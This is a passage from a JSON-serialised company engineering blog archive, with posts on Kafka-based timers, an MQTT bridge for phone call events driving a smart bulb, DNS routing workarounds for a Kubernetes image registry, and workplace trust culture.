recent events on the *topic*,\\nand the *streams library* is a software library implementing the concept of the *stream*.\\n\\nA kafka topic resides inside the Kafka servers, but Kafka streams library keeps track of a topic\'s most recent\\nevents on the application side - the stream. The stream is a key/value cache with random read access unlike\\nappend only topic log. Key/value cache is not the only thing the library provides. It can also join\\nthe streams. When an event and its key appear on a stream, the library looks up the same key in the other streams participating in the join.\\nIt is using key/value cache associated with each stream and gives the result to the application.\\nThe result will have the present event enriched with the matched past events from the joined streams.\\nJoining two streams will yield the timer callback. Let\'s see how.\\n\\n## Implementation\\nSince it is Kafka, timer expiration shall result in an event posted on a topic of user\'s choice at the right time.\\nThis event is delayed until due time by joining two streams: *oscillator* and *timer-request*. Callback\\nevent is pushed to *timer-request* topic with key equal to the expiration timestamp. Oscillator topic\\nis the clock dial counting seconds since UNIX epoch in real time. At some point it will get to the second\\nwhich is equal to the key on *timer-request* topic, and the join will come up with the callback event.\\n\\nAn excellent summary on \\"timer wheel\\" and other timer algorithms can be found in this linux kernel [thread](https://lwn.net/Articles/156329/).\\nOur implementation of timers using Kafka resembles the \\"timer wheel\\" algorithm with a bucket on each second to keep callbacks.\\n*Oscillator* topic models rotating clock dial, *timer-request* is bucketing callbacks by the expiration timestamp, and join of these two\\ncontains content of the expired bucket with all the callbacks in it.\\n\\n![](/img/blog/kafka-timers/kt.png)\\n\\nThere are two Kafka applications running together to service these topics:\\n* Oscillator\\n* Futures\\n\\n### Oscillator\\n\\nWith the resolution of 1 second oscillator keeps pushing *oscillator* topic:\\n```kotlin\\nwhile (running) {\\n    val nowSeconds = System.currentTimeMillis() / 1000L\\n    while (timestampSeconds < nowSeconds) {\\n        timestampSeconds++\\n        KafkaProducers.send(\\n            \\"oscillator\\",\\n            timestampSeconds.toString(),\\n            \\"1\\"\\n        )\\n    }\\n    Thread.sleep(200)\\n}\\n\\n```\\n\\n### Futures\\n\\nWhen requesting a timer by pushing *timer-request* topic, the user provides a callback structure\\nused to dispatch timer event:\\n\\n```\\nmessage Future {\\n    string callBackTopic = 1;\\n    string callBackKey = 2;\\n    bytes callBack = 3;\\n}\\n```\\n\\nJoining two streams on the key equal to the UNIX second will give all expired timers, and\\ntheir callback coordinates.\\n\\nFirst, setup a join with *WINDOW_SIZE* large enough to cover the longest timer duration\\n\\n```kotlin\\nval oscillator = builder.stream<String, String>(\\"oscillator\\")\\nval timerRequest = builder.stream(\\"timer-request\\", Consumed.with(Serdes.String(), FutureSerde()))\\nval timeoutEvents =\\n    oscillator.join(\\n            timerRequest,\\n            { _: String?, future: Future -> future },\\n            JoinWindows.of(WINDOW_SIZE),\\n            StreamJoined.with(\\n                    Serdes.String(),\\n                    Serdes.String(),\\n                    FutureSerde()\\n            ).withThisStoreSupplier(\\n                    Stores.persistentWindowStore(\\n                            \\"join-this-store\\",\\n                            WINDOW_SIZE.plusMinutes(30),\\n                            WINDOW_SIZE,\\n                            true\\n                    )\\n            ).withOtherStoreSupplier(\\n                    Stores.persistentWindowStore(\\n                            \\"join-other-store\\",\\n                            WINDOW_SIZE.plusMinutes(30),\\n                            WINDOW_SIZE,\\n                            true\\n                    )\\n            )\\n    )\\n```\\n\\nSecond, kick of the processing loop looking for expired timers\\n\\n```kotlin\\ntimeoutEvents.process(\\n        ProcessorSupplier {\\n            object : Processor<String, Future> {\\n                override fun init(context: ProcessorContext) {}\\n                override fun process(key: String, value: Future) {\\n                    KafkaProducers.send(Topic.valueOf(value.callBackTopic),\\n                            value.callBackKey,\\n                            value.callBack.toByteArray()\\n                    )\\n                    Metrics.timerFired(value.callBackTopic)\\n                }\\n\\n                override fun close() {}\\n            }\\n        }\\n)\\n\\n```\\n### Cancelling a timer\\nThere is no way to cancel these timers as events can\'t be easily removed from the Kafka stream.\\nStill, it is possible to ignore timer events by using a token in callback request, and a variable\\nin timer receiver state. When scheduling a timer the receiver puts the same token in two places:\\n\\n* callback struct it publishes on the *timer-request* topic\\n* internal variable timerToken\\n\\nAs timer fires receiver compares value in timerToken and in the callback event. Based on the result it\\ndraws a conclusion if timer is to be ignored or not. All it has to do to cancel a timer is to reset\\nvalue in its timerToken variable.\\n\\nSince normally Kafka does \\"at least once\\" delivery it is a good idea to reset the timerToken immediately\\nafter notification event.\\n\\n### What to worry about\\n\\nKafka streams library is using local disk storage to keep the cache. The storage shall be large enough to host\\nall timer requests based on the product of *timer-request* topic retention, callback size and timer scheduling rate.\\nThankfully Kafka is well-equipped to deal with this sort of troubles.\\n\\nOscillator must keep ticking otherwise timers will stop coming. Make sure to have\\nmetrics/alarms in place to stay on top of Oscillator health. Deploy few of them for redundancy having in\\nmind the extra load they will generate on timer users.\\n\\n## Conclusion\\n\\nThere are many options to export application state to the data tier layer. Timers are often part of that\\nstate. Above we showed how to apply Kafka primitives to achieve a goal of making application \\"stateless\\" even\\nif the state is using timers. It has its costs and benefits.\\n\\nCheck out openings on the [Careers page](https://wgtwo.com/career) if you\u2019re interested in building the future Telco backbone."},{"id":"mqtt-event-bridge","metadata":{"permalink":"/blog/mqtt-event-bridge","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2021-01-07-mqtt-event-bridge.md","source":"@site/../blog/2021-01-07-mqtt-event-bridge.md","title":"Changing the color of your bulbs: The fancy way","description":"last hackathon i did setup a mqtt integration towards wgtwo\'s apis to enable call notifications via my ikea tr\xe5dfri bulb so i can finally notice my wife calling me. the bulb changes color when my phone is ringing and when I am in a call, without me needing to install anything to my phone.","date":"2021-01-07T00:00:00.000Z","formattedDate":"January 7, 2021","tags":[{"label":"api","permalink":"/blog/tags/api"},{"label":"grpc","permalink":"/blog/tags/grpc"},{"label":"mqtt","permalink":"/blog/tags/mqtt"},{"label":"node-red","permalink":"/blog/tags/node-red"}],"readingTime":5.46,"truncated":true,"authors":[{"name":"Gunnar Inge G. Sortland","title":"Software Engineer @ wgtwo","url":"https://www.linkedin.com/in/gunnaringe/","imageURL":"https://media-exp1.licdn.com/dms/image/C4E03AQFnInHIEXjS7w/profile-displayphoto-shrink_400_400/0/1516312934330?e=1648684800&v=beta&t=FafxE3bOUsOclBJCs5mN2iXXnu3ifBW83TbjDgItL0c","key":"gunnar-inge"}],"frontMatter":{"slug":"mqtt-event-bridge","title":"Changing the color of your bulbs: The fancy way","date":"2021-01-07T00:00:00.000Z","tags":["api","grpc","mqtt","node-red"],"authors":["gunnar-inge"]},"prevItem":{"title":"Kafka timers","permalink":"/blog/kafka-timers"},"nextItem":{"title":"Forbidden lore: hacking DNS routing for k8s","permalink":"/blog/forbidden-lore-hacking-dns-routing-for-k8s"}},"content":"last hackathon i did setup a mqtt integration towards **wgtwo**\'s apis to enable call notifications via my ikea tr\xe5dfri bulb so i can finally notice my wife calling me. the bulb changes color when my phone is ringing and when I am in a call, without me needing to install anything to my phone.\\n\\n\x3c!--truncate--\x3e\\n\\n![](/img/blog/mqtt-event-bridge/animation.webp)\\n\\n---\\n\\nThere are a variety of events generated by **wgtwo**\u2019s systems for subscriptions on the platform. This includes information such as call events, SMS sent to and from a subscription (including content), voicemail events, location events, and more.\\n\\nWe offer a [gRPC API](https://docs.wgtwo.com/events/listen-for-events/) which enables developers to listen to a selection of these events.\\n\\nI wanted to make a super simple setup so that I could configure home automation rules, e.g. **\\"If someone calls me, make my IKEA bulb change color to notify me\\"** or **\\"If I send myself a SMS with \'Leaf ON\', turn on the heater in my car\\"**.\\n\\nA lot of home automation tools, such as Node-RED and Home Assistant have great MQTT support, so instead of writing a native gRPC integration I wanted to make a more flexible solution by offering these events over MQTT. This way, anyone using a home automation tool with MQTT support can integrate with our platform easily.\\n\\nDuring our last hackathon I built a simple bridge between our events API and MQTT. I wrote this bridge in Go, using [Mochi MQTT](https://github.com/mochi-co/mqtt) as an embedded MQTT server.\\n\\nThe flow is shown in this sketch:\\n![](/img/blog/mqtt-event-bridge/sketch.svg)\\n\\nThe way it works is quite simple: You log in to the service using our OAuth solution. You then grant the service access to fetch events on your behalf. The service will then generate a username and password for you.\\n\\nThe service will fetch events for all subscribers that have enabled it and publish these to the MQTT server with topic `{phone number}/events/{type}`. With the generated credentials, you may then subscribe to these events.\\n\\nNote that nothing of this requires any setup on your phone, so it would work equally well on a 20-30 year old Nokia phone.\\n\\nAs I\'ll explain in more detail below, I did setup a quick Node-RED flow to consume these events as shown in the video below:\\n\\n# [video](/video/blog/mqtt-event-bridge/calling.mp4)\\n\\nHere you can see that:\\n1. The light changes to cool white when the call is initiated (phone not yet ringing)\\n2. It turns pink when the phone is ringing\\n3. It turns red when we pick up the call\\n4. It returns to normal after the call has ended\\n\\n## Connecting to **wgtwo**\'s API\\n\\nWe will use a normal OAuth2 authorization code grant for logging in to our service.\\n\\nTo handle this, we used the module `github.com/markbates/goth` with the following settings:\\n\\n```go\\nimport \\"golang.org/x/oauth2\\"\\n\\nconst endpointProfile string = \\"https://id.wgtwo.com/userinfo\\"\\n\\nvar Endpoint = oauth2.Endpoint{\\n  AuthURL:  \\"https://id.wgtwo.com/oauth2/auth\\",\\n  TokenURL: \\"https://id.wgtwo.com/oauth2/token\\",\\n}\\n```\\n\\nWhen logging in, the user will be asked to consent to the following scopes:\\n- phone: Allowing the service to fetch the user\u2019s phone number\\n- offline_access: Giving the service a refresh token\\n- events.voice.subscribe: Allow the service to see all call events\\n- events.voicemail.subscribe: Allow the service to see if a voicemail has been left\\n- events.sms.subscribe: Allow the service to get a copy of every SMS sent and received\\n\\nAll the events you have consented to share with the service will be stored in the service\'s queue.\\n\\n```\\nsms events        \u2500\u256e\\nvoice events      \u2500\u253c\u2500\u25b7  queue  \u25c1\u2500\u2500 gRPC API\\nvoice mail events \u2500\u256f\\n```\\n\\nThis queue can be consumed by using the events streaming API ([docs](https://docs.wgtwo.com/events/listen-for-events/)), which requires the service to use the OAuth2 client credentials grant flow.\\n\\nEvents will be shared with the service as long as there exists an active consent.\\n\\nWe then initiate the server side stream to fetch the events:\\n```go\\nrequest := &pb.SubscribeEventsRequest{\\n  Type:          []pb.EventType{pb.EventType_VOICEMAIL_EVENT},\\n  StartPosition: &pb.SubscribeEventsRequest_StartAtOldestPossible{},\\n  ClientId:      uuid.New().String(),\\n  QueueName:     \\"wgtwo-mqtt-demo\\",\\n  DurableName:   \\"wgtwo-mqtt-demo\\",\\n  MaxInFlight:   10,\\n  ManualAck: &pb.ManualAckConfig{\\n     Enable:  true,\\n     Timeout: ptypes.DurationProto(10 * time.Second),\\n  },\\n}\\nr, err := c.Subscribe(context.TODO(), request)\\n\\nfor {\\n  response, err := r.Recv()\\n  if err == io.EOF || err != nil {\\n     break\\n  }\\n\\n  event := response.Event\\n  // PUBLISH EVENT TO MQTT SERVER ON TOPIC {event owner}/events/{type}\\n}\\n```\\n\\n## Connecting to our new MQTT service\\nThe service has a very pretty landing page (Disclaimer: I am not a designer).\\n\\n![landing page](/img/blog/mqtt-event-bridge/landing-page.png)\\n\\nClicking this button takes you to the login page:\\n\\n<div class=\\"post-images halves\\" markdown=\\"1\\">\\n![](/img/blog/mqtt-event-bridge/login-enter-phonenumber.png)\\n![](/img/blog/mqtt-event-bridge/login-pin.png)\\n</div>\\n\\n\u2026 and then asks you to allow our service to get your voice event and new voicemails. As I am only interested in the voice events here, I\u2019ll only grant that.\\n\\nAs this is an experimental app which hasn\u2019t been approved by anyone, our login page will give you a clear warning about trusting this.\\n\\n<div class=\\"post-images single\\" markdown=\\"1\\">\\n![](/img/blog/mqtt-event-bridge/login-consent.png)\\n</div>\\n\\nWhen that is done, it returns to our app showing this beautiful UI (still not a designer):\\n\\n![](/img/blog/mqtt-event-bridge/success.png)\\n\\nThe generated credentials will allow you to listen any topic matching `{phone number}/#`.\\n\\nThe following is the output from pasting that mosquitto_sub command in my terminal. It shows that I first called my Swedish number and hanging up before it was actually ringing.\\n\\n```json\\n{\\"event\\":{\\"metadata\\":{\\"sequence\\":\\"1\\",\\"ackInbox\\":\\"_INBOX.VMTx7rnS0i3qXpHfuS5t3b\\"},\\"timestamp\\":\\"2021-01-06T11:24:40Z\\",\\"serviceId\\":\\"wotel\\",\\"voiceEvent\\":{\\"callId\\":\\"0c056e2c-07f9-4c2b-b5ca-042f160af42f\\",\\"type\\":\\"CALL_INITIATED\\",\\"fromNumber\\":{\\"e164\\":\\"+4712345678\\"},\\"toNumber\\":{\\"e164\\":\\"+46123456789\\"},\\"owner\\":{\\"e164\\":\\"+46123456789\\"}}}}\\n{\\"event\\":{\\"metadata\\":{\\"sequence\\":\\"2\\",\\"ackInbox\\":\\"_INBOX.VMTx7rnS0i3qXpHfuS5t3b\\"},\\"timestamp\\":\\"2021-01-06T11:24:43Z\\",\\"serviceId\\":\\"wotel\\",\\"voiceEvent\\":{\\"callId\\":\\"0c056e2c-07f9-4c2b-b5ca-042f160af42f\\",\\"type\\":\\"CALL_ENDED\\",\\"fromNumber\\":{\\"e164\\":\\"+4712345678\\"},\\"toNumber\\":{\\"e164\\":\\"+46123456789\\"},\\"owner\\":{\\"e164\\":\\"+46123456789\\"}}}}\\n```\\n\\nIf you run any home automation or other hobby projects at home, chances are that you already have a MQTT broker running.\\nYou could then setup bridging to not worry about credentials and TLS when consuming your events.\\n\\n## Wrapping it all up\\nFor this project I chose to use Node-RED, as it allows for very quick and easy to show drag-and-drop integrations.\\n\\nTo control the lamp, we did add the module `node-red-contrib-tradfri` as described in the Node-RED [documentation](https://flows.nodered.org/node/node-red-contrib-tradfri).\\n\\nFirst we did add a `mqtt out` node configured to listen to the topic 46123456789/# with output as a parsed JSON object using the credentials we got on login.\\n\\n![](/img/blog/mqtt-event-bridge/nodered-debug.png)\\n\\nWe then simply hooked its output to a debug node. Looking at the output, we can see that the event object has a key `voiceEvent`, as this is a voice event.\\n\\n![](/img/blog/mqtt-event-bridge/nodered-flow.png)\\n\\nThen we added a switch for handling it as a voice event if the voiceEvent key exists. Likewise, we added a new switch on the type field of that event.\\n\\nEach of those functions simply set the Tr\xe5dfri payload, as shown below:\\n\\n```json\\n{\\"state\\":\\"on\\",\\"color\\":\\"cool daylight\\"}\\n```\\n\\nAs this was created quickly as a hackathon project, the intention was never to actually make anything useful. Using this quick flow, it is however clear that it could be very useful for when my wife tries to call me, but I am programming equipped with my noise-cancelling headphones."},{"id":"forbidden-lore-hacking-dns-routing-for-k8s","metadata":{"permalink":"/blog/forbidden-lore-hacking-dns-routing-for-k8s","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2020-12-11-forbidden-lore-hacking-dns-routing-for-k8s.md","source":"@site/../blog/2020-12-11-forbidden-lore-hacking-dns-routing-for-k8s.md","title":"Forbidden lore: hacking DNS routing for k8s","description":"At WG2 we\u2019re coming close to having everything running in Kubernetes, which means that almost everything we deploy needs to be pulled from a registry. We have run our own local registry for some time now, to host both locally-built images and cached images from Docker Hub.","date":"2020-12-11T00:00:00.000Z","formattedDate":"December 11, 2020","tags":[{"label":"dns","permalink":"/blog/tags/dns"},{"label":"nginx","permalink":"/blog/tags/nginx"},{"label":"kubernetes","permalink":"/blog/tags/kubernetes"},{"label":"infrastructure","permalink":"/blog/tags/infrastructure"}],"readingTime":7.505,"truncated":true,"authors":[{"name":"Anna Kennedy","title":"Software Engineer @ wgtwo","url":"https://www.linkedin.com/in/annaken","imageURL":"https://media-exp1.licdn.com/dms/image/C4E03AQG43m4lVjJm8g/profile-displayphoto-shrink_400_400/0/1517558635100?e=1648684800&v=beta&t=BXA0nV3ZTaID9m1UD7GMS87NhYZRsYPcrPiIg30SYRw","key":"anna-kennedy"},{"name":"Holger Ihrig","title":"Software Engineer @ wgtwo","url":"https://www.linkedin.com/in/hihrig/","imageURL":"https://media-exp1.licdn.com/dms/image/C5603AQGc3sG-ltGzlA/profile-displayphoto-shrink_400_400/0/1516250699138?e=1648684800&v=beta&t=qpxr39O2hNY54vsUcCbt1wH8fc2lMf07zW1etQD_gxY","key":"holger-ihrig"},{"name":"Matt Long","title":"Engineering Manager for Edge, Cloud and Security","url":"https://www.linkedin.com/in/mattlong/","imageURL":"/img/author-photos/mtl-li.jpg","key":"mtl"},{"name":"Yan Grunenberger","title":"Software Engineer","url":"https://www.linkedin.com/in/yangrunenberger/","imageURL":"https://media-exp1.licdn.com/dms/image/C5103AQGoJqu0xm9NQA/profile-displayphoto-shrink_200_200/0/1516341401517?e=1649894400&v=beta&t=hQWH1btszoHHB0CfWVgWn3G-q4ASOEEbvGrOz9oQG7M","key":"yan"}],"frontMatter":{"slug":"forbidden-lore-hacking-dns-routing-for-k8s","title":"Forbidden lore: hacking DNS routing for k8s","date":"2020-12-11T00:00:00.000Z","tags":["dns","nginx","kubernetes","infrastructure"],"authors":["anna-kennedy","holger-ihrig","mtl","yan"]},"prevItem":{"title":"Changing the color of your bulbs: The fancy way","permalink":"/blog/mqtt-event-bridge"},"nextItem":{"title":"We\'re all grownups here","permalink":"/blog/were-all-grownups-here"}},"content":"At WG2 we\u2019re coming close to having everything running in Kubernetes, which means that almost everything we deploy needs to be pulled from a registry. We have run our own local registry for some time now, to host both locally-built images and cached images from Docker Hub.\\n\\n\x3c!--truncate--\x3e\\n\\nWe recently decided to improve the registry solution by implementing [Harbor](https://goharbor.io/) to scan images for vulnerabilities on upload, and replicating the registry into each of our multiple environments and regions. This would both eliminate Harbor as a single point of failure, and allow each cluster to pull images locally to minimise data transfer costs through the NAT gateway.\\n\\nThe overall workflow would look something like:\\n\\n* images are built and uploaded to Harbor\\n* Harbor scans for vulnerabilities and pushes images to a private registry\\n* this registry is replicated to a read-only registry\\n* the read-only registry is replicated to all environments and regions\\n* the Kubernetes cluster in each environment deploys from the local read-only registry\\n\\n![Workflow](/img/blog/forbidden-lore-hacking-dns-routing-for-k8s/multiregion.jpg)\\n\\nHarbor has to live somewhere, so we decided it should live in the dev environment, close to the CI system that builds the majority of our images. However, container image names contain the registry location that they are pulled from / pushed to, eg `reg.wgtwo.com/infra/logstash`. Therefore in the dev environment we have to find a way to deal with the fact that we want users and the CI system to push to Harbor, but we also want Kubernetes to pull images from the read-only registry.\\n\\nSo the main problem becomes: if the image name includes the url `reg.wgtwo.com`, how to make that point to two different places depending on usage?\\n\\n# Solution 1: DNS\\n\\nIn non-dev environments, the obvious solution is to redirect `reg.wgtwo.com -> read-only-registry` in Kubernetes CoreDNS. But in dev, we need different services to go to different places. The DNS model thus needs to look like:\\n\\n![DNS](/img/blog/forbidden-lore-hacking-dns-routing-for-k8s/dnsresolution.jpg)\\n\\nIn other words,\\n\\n* ``Route53`` sets `reg.wgtwo.com -> harbor`\\n* K8s coreDNS sets `reg.wgtwo.com -> read-only-registry`\\n* CI (Concourse) bypasses cluster lookup and goes to ``Route53`` instead, such that `reg.wgtwo.com -> harbor`\\n\\nWe initially deployed a DNS sidecar to the CI system, but with multiple Concourse pods we got multiple sidecars and we really only needed one, plus we had to manipulate Concourse\u2019s internal DNS cache (`CONCOURSE_GARDEN_DNS_SERVER`) but that broke DNS between Concourse and everything else in the cluster. Replacing the sidecar with a DNS pod in the CI namespace worked better, although then all the CI jobs needed to be updated to use that new pod as their nameserver.\\n\\n![Sleight of hand](/img/blog/forbidden-lore-hacking-dns-routing-for-k8s/sleight-of-hand.gif)\\n\\nHowever at this point we realised that although we want to deploy pods into Kubernetes, the process that does the deploying lives on the Kubernetes nodes, outside of cluster scope.\\nWe don\u2019t do any config management on the nodes, we just let [kOps](https://github.com/kubernetes/kops) deploy everything that Kubernetes needs for a cluster, so we were reluctant to introduce an entirely different system just for managing one `resolv.conf` file. Also the concentric DNS setup would have a very wide scope and be somewhat difficult to debug. Maybe this was a problem better resolved using some clever nginx routing?\\n\\n# Solution 2: nginx\\n\\nIf we could find some way of differentiating the Harbor traffic from read-only-registry traffic, we could let nginx route requests to the right place.\\n<iframe src=\\"https://giphy.com/embed/QaPkV29BJh3gI\\" width=\\"240\\" height=\\"177\\" frameBorder=\\"0\\" class=\\"giphy-embed\\" allowFullScreen></iframe>\\n\\n\\n# Solution 2a: nginx routes traffic on IP\\n\\n* Traffic from the outside world plus traffic from Concourse needs to go to Harbor.\\n* Traffic from the Kubernetes cluster needs to go to the read-only-registry.\\n\\nThe [nginx geo module](http://nginx.org/en/docs/http/ngx_http_geo_module.html) sounded like a good idea, where we could set our internal subnet ranges to go to the read-only-registry. However getting the ingress annotations to put this config in the right place turned out to be challenging, since it needs to go outside of both `http snippet` and `server snippet` blocks. But before we dug further into this issue we realised that all of the traffic to nginx would arrive via the internet gateway, meaning we wouldn\u2019t see source IP anyway.\\n\\n# Solution 2b: nginx routes on custom header\\n\\nThe new `canary` feature in nginx makes this kind of routing very easy - traffic that matches a certain criteria gets sent to a different backend. We could use a custom header such as `ro-reg` to send internal traffic to the read-only registry.\\n\\n    annotations:\\n      nginx.ingress.kubernetes.io/canary: \\"true\\"\\n      nginx.ingress.kubernetes.io/canary-by-header: \\"ro-reg\\"\\n\\nThe docker (client) config has an [HttpHeaders](https://github.com/docker/cli/blob/master/man/docker-config-json.5.md) section, so it would be easy enough to add this section to all of our image-pull secrets, meaning all internal pulls - but nothing else - should go to the read-only registry.\\n\\nWe had to rearrange things a little in order to terminate SSL on nginx and not at the registry so that nginx would be able to read the headers, but that was straightforward.\\n\\nIn our initial tests from the laptop, this worked great. However it quickly transpired that this was the only place it worked from. Where we needed it to work from - the Kubernetes nodes - didn\u2019t run Docker, they run ``docker-shim`` on top of ``containerd``, and ``HttpHeaders`` [are not implemented yet](https://github.com/containerd/cri/issues/1400). Back to the drawing board.\\n\\n# Solution 2c: nginx routes on auth header\\n\\nGetting nervous that we\u2019d used a week to get nothing working, we started clutching at some very hacky straws. Even if docker-shim doesn\u2019t send custom headers, we could see it sending auth headers, and we have different login details for Harbor versus the read-only registry. We wondered if we could route on the auth hash, postponing entirely the discussion about whether we should do such a horrible thing, or the security implications of having the auth hash in a plaintext nginx config.\\n<iframe src=\\"https://giphy.com/embed/I8RMi1UY8cEKs\\"  frameBorder=\\"20px\\" class=\\"giphy-embed\\" allowFullScreen></iframe>\\n\\n\\nWe soon discovered that this solution was also never going to work. In Kubernetes, it is the ``kubelet`` process that does the image pull at the start of a pod deployment, and after some wiresharking it turns out that the very first thing kubelet does is make an unauthenticated call to the `registry/v2` endpoint to fetch metadata which it then uses to begin authentication.\\n\\nThis is expected behaviour for a docker registry, [according to documentation](https://docs.docker.com/registry/spec/auth/token/), but with nginx routing on auth header, it meant that the initial call was routed to Harbor which sent back an auth URL also for Harbor, and thus kubelet never even arrived at the read-only registry, let alone managed to authenticate.\\n\\n# Aside: other issues with headers\\n\\nDuring this debugging session we also realised that we\u2019d been creating image-pull secrets in Kubernetes with both `.dockercfg` and `.dockerconfigjson`, not realising that `.dockercfg` [is the old format](https://github.com/moby/moby/pull/12009) and that `.dockercfg` likely does not support HttpHeaders at all.\\n\\nKubelet [does support HttpHeaders](https://github.com/Kubernetes/Kubernetes/blob/e1fd2d7ff57af153023347d72d17226effd917c8/pkg/credentialprovider/config.go#L44), but relies on the underlying container runtime to also support them - which is not the case for containerd.\\n\\nAdditionally, when creating a Kubernetes secret containing `.dockerconfigjson`, it appears that it is very important that there is no whitespace in the secret, or authentication will fail.\\n\\n# Solution 2d: route on some other inherent header\\n\\nAs one final attempt at making nginx routing work, we looked for other headers being sent, but there was no single header that let us differentiate between kubelet, laptop, and Concourse.\\n\\nKubelet sends a useragent of either `docker` or `go-http-agent` (depending on whether the call is the initial one or a retrial) and filtering on `go-http-agent` also catches Concourse requests, rendering it useless for this task. We were also worried it might end up catching all sorts of unintended cases since we have quite a lot of `go`-based applications in our ecosystem.\\n\\nWe took a moment to mourn the loss of our nginx idea, and went back to a DNS solution.\\n\\n![Mourn](/img/blog/forbidden-lore-hacking-dns-routing-for-k8s/pulpfiction.jpg)\\n\\n# Solution 3: DNS, again\\n\\nWe put the DNS solution back in place again, where\\n\\n* ``Route53`` sets `reg.wgtwo.com -> harbor`\\n* K8s nodes set `reg.wgtwo.com -> read-only-registry`\\n* K8s coreDNS sets `reg.wgtwo.com -> read-only-registry`\\n* CI runs an additional coreDNS pod setting `reg.wgtwo.com -> harbor`\\n* Concourse uses CI coreDNS pod to set `reg.wgtwo.com -> harbor`\\n\\nWhich brought us back to the problem that was still there: how to update `/etc/resolv.conf` on the nodes. In the continued absence of config management, we hit upon the wonderful hack of using a privileged pod daemonset to manage the config for us via systemd.\\n\\nThe privileged pod on each node would write a new config file to `/etc/systemd/resolvd.conf`, and then restart the systemd service to update the running resolvd process.\\n\\nThis would thus control configuration on the Kubernetes node from inside of Kubernetes, which is admittedly morally wrong but also works really well. It also keeps the configuration alongside all the rest of our configuration instead of hidden away somewhere new.\\n\\n![wheel change](/img/blog/forbidden-lore-hacking-dns-routing-for-k8s/wheelchange.gif)\\n\\nA future solution might be to implement some kind of local DNS server/cache on each node, but for now we\u2019ll settle for a working system and a huge increase in knowledge about the inner workings of many of our components."},{"id":"were-all-grownups-here","metadata":{"permalink":"/blog/were-all-grownups-here","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2020-11-20-were-all-grownups-here.md","source":"@site/../blog/2020-11-20-were-all-grownups-here.md","title":"We\'re all grownups here","description":"I have always struggled with company HR policies that make me not feel trusted. Why don\u2019t HR and/or management trust who they hire? Why create HR processes for the very few people who don\u2019t behave? Shouldn\u2019t processes be designed for the vast majority of people who are to be trusted? I just don\u2019t get it. If you are given freedom it comes with a lot of responsibility, isn\u2019t that rather implicit?","date":"2020-11-20T00:00:00.000Z","formattedDate":"November 20, 2020","tags":[{"label":"trust","permalink":"/blog/tags/trust"},{"label":"culture","permalink":"/blog/tags/culture"},{"label":"startup","permalink":"/blog/tags/startup"}],"readingTime":5.915,"truncated":true,"authors":[{"name":"Victoria Hicks M\xf8rkved","title":"Head of People @ wgtwo","url":"https://www.linkedin.com/in/victoriamorkved/","imageURL":"https://media-exp1.licdn.com/dms/image/C4E03AQHnYK6C3HVblQ/profile-displayphoto-shrink_400_400/0/1539070971717?e=1648684800&v=beta&t=Q-3O9K1AtDxEx4PiaIxaHcVCmMmfodggCe2n89JXMJA","key":"victoria-hicks"}],"frontMatter":{"slug":"were-all-grownups-here","title":"We\'re all grownups here","date":"2020-11-20T00:00:00.000Z","tags":["trust","culture","startup"],"authors":"victoria-hicks"},"prevItem":{"title":"Forbidden lore: hacking DNS routing for k8s","permalink":"/blog/forbidden-lore-hacking-dns-routing-for-k8s"},"nextItem":{"title":"October Virtual Hackdays","permalink":"/blog/hackdays-october-2020"}},"content":"I have always struggled with company HR policies that make me not feel trusted. Why don\u2019t HR and/or management trust who they hire? Why create HR processes for the very few people who don\u2019t behave? Shouldn\u2019t processes be designed for the vast majority of people who are to be trusted? I just don\u2019t get it. If you are given freedom it comes with a lot of responsibility, isn\u2019t that rather implicit?\\n\\n\x3c!--truncate--\x3e\\n\\nIt comes down to a choice - minimize risk by implementing all possible controls, or trust people and implement necessary controls only. We believe the latter drives ownership, motivation and a better product and company. That doesn\u2019t mean it is easy though - the need to control is a fundamental human need, and we need daily reminders to always push in the opposite direction.\\n\\nWhen I was in discussions with Erlend (our CEO) about joining **wgtwo**, the term \u201cstartup for grownups\u201d was used and I remember thinking \u201chuh, that makes sense\u201d. Now, 2 years in, the simple fact that yes we are all grownups here and we all deserve to be treated as such has become an embedded part of our company culture.\\n\\nI wanted to give you some tangible examples of how we do things. For context, we are a startup tech company with a team of ~50 (87% engineers). We have offices in Oslo, Trondheim, Stockholm, a hub in Germany and remote team members in Japan, Spain, the U.S., Canada, London and Myanmar.\\n\\n## What approvals?\\n\\nWe try to minimize that amount of approvals necessary to a minimum. Here is how we communicate that to new hires in some of the areas companies typically have approvals\\n* Vacation: Yes, we do have the standard 25 days of vacation (standard in the Nordics) in our contracts. But, we also trust you to know yourself best, and understand that no year or situation is the same. Sometimes you might need more, sometimes less. As long as it works for your team, we trust you to make a judgement. We also trust that you take enough time off as we all need time off to reset and recharge.\\n* Expenses: We trust your judgement and that you wouldn\u2019t be making the purchase if it wasn\u2019t necessary for you and the team. This applies when deciding on which equipment (i.e. laptop, monitor, keyboard, phone etc) you need when you start and later if there is something you need. I have yet to experience anyone asking for anything totally unreasonable. Of course you are welcome to reach out if you are unsure and from time to time we might have discussions, but surprisingly seldom to be honest.\\n* Travel: We encourage you to travel between offices to build a strong relationship with the whole team (unfortunately not now of course with the covid-19 going on). You do not need approval to book travel, and remember you don\u2019t need a \u201creason\u201d to go.\\n* Working hours: As long as you do a good job we don\u2019t care if you work half days Mondays or start working at lunch time and into the evening, go to the gym and so on. Up to you, as long as it works for your team. Not to mention where you work from. Office, home, cabin, boat - who cares as long as you are connected right?\\n\\nThese aren\u2019t necessarily big things in everyday life, but they take out administrative hassle, and it aligns with the messaging of that we try to trust each other.\\n\\n## Are you a role model?\\n\\nThis lack of approvals does create another need though - the need for role models. So we do remind the team to keep in mind that we are role models for each other. It provides alignment. Whether it\u2019s sharing with the others that the train ticket prices are currently low and recommend people to book now to save money, or taking initiative to set up a virtual social Friday get-together to end the week together. We even have our own role model emoji in slack, which we sometimes remember to use and I do believe people feel proud if they get one.\\n![Decorative illustration](/img/blog/were-all-grownups-here/04.png)\\n\\n## Sharing is caring\\n\\nThat we see each other as grownups is also evident in how we communicate and what information we trust each other with. If there is one thing the team mentions to me that has surprised them the most after joining, it is the amount of information that is shared across the team about sales, customer meetings and other business processes. The good and the bad. When I had a \u201c6 months in\u201d check-in with one of our newest team members he emphasized exactly this and explained how this made him feel involved and prepared for what was coming. It is also evident when people choose to share that they are struggling with the likes of depression or something else often considered very private. Or just putting up your hand and saying \u201cI broke something\u201d and taking responsibility for that. I believe this level of sharing is possible because we trust each other and have each other\'s backs and management leads the way when it comes to sharing.\\n\\n## Direction\\n\\nTo clarify. We do of course need to make sure we move the company in the right direction together. We have 